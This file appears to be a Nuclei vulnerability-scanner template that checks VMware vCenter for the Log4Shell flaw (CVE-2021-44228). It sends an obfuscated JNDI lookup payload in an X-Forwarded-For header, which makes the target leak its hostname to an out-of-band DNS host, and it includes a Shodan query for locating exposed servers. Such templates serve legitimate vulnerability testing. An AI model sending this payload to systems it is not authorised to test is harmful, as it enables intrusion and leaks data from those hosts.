id: vmware-vcenter-log4j-rce

info:
  name: VMware VCenter - 远程代码执行漏洞
  author: _0xf4n9x_
  severity: critical
  description: VMware VCenter - 远程代码执行 (Apache Log4j) 受 Apache Log4j 相关缺陷影响，攻击者可在满足利用条件时触发远程代码执行漏洞。该模板通过实际请求与特征匹配验证目标是否仍暴露该漏洞面。
  reference:
    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://twitter.com/tnpitsecurity/status/1469429810216771589
    - https://logging.apache.org/log4j/2.x/security.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-78,CWE-502
    cpe: cpe:2.3:a:vmware:vcenter_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    shodan-query: title:"VMware VCenter"
    product: vcenter_server
    vendor: vmware
  tags: cve,cve2021,rce,jndi,log4j,vcenter,vmware,oast,kev,vuln

http:
  - raw:
      - |
        GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable

    extractors:
      - type: regex
        group: 1
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${hostName} in output
        part: interactsh_request
# digest: 4a0a00473045022053c027d73e42438754c6507109a39bb7a15ad47c3776fe7f2b2bac4da104bd01022100b55a0f20b8b69dcaa207320b1414f21727446658c178d71aca3c9242b804d77a:922c64590222798bb761d5b6d8e72950